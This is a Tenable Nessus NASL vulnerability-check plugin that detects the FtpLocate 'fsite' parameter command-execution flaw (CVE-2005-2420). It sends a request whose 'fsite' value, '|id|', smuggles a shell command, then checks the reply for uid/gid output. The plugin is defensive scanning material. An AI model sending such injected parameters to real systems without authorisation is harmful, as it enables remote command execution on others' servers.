#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a Perl script that is allows arbitrary
commands to be executed. 

Description :

The remote host is running FtpLocate, a web search engine for FTP
sites written in Perl. 

The installed version of FtpLocate allows remote attackers to execute
commands on the remote host by manipulating input to the 'fsite'
parameter in various scripts. 

See also : 

http://www.securityfocus.com/archive/1/406373/30/0/threaded

Solution : 

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19300);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2420");
  script_bugtraq_id(14367);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"18305");

  name["english"] = "FtpLocate fsite Parameter Command Execution Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc);
 
  summary["english"] = "Checks for fsite parameter command execution vulnerability in FtpLocate";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');


if (thorough_tests) 
  extra_list = make_list("/ftplocate", "/cgi-bin/ftplocate");
else 
  extra_list = NULL;

http_check_remote_code (
			extra_dirs: extra_list,
			check_request:"/flserv.pl?cmd=exec_flsearch&query=" + SCRIPT_NAME + "&fsite=|id|",
			extra_check:"cache hit",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
